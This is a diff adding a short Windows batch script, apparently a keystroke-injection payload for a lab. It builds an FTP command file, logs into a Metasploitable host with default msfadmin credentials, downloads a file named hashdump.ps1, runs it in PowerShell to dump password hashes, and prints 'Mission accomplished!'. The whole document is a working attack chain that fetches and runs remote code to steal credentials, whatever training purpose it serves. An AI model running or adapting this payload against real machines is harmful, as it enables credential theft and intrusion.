@@ -1,0 +1,16 @@
+cmd/c
+rmdir /S /Q C:\OMG
+md C:\OMG
+timeout 4
+cd C:\OMG
+timeout 4
+echo open <Metasploitable IP> >> ftp &echo user msfadmin msfadmin >> ftp &echo binary >> ftp &echo get hashdump.ps1.txt >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp
+timeout 4
+ren c:\OMG\hashdump.ps1.txt hashdump.ps1
+timeout 4
+echo "hashdump.ps1 is running"
+timeout 4
+powershell .\hashdump.ps1
+echo "Mission accomplished!"
+timeout 4
+
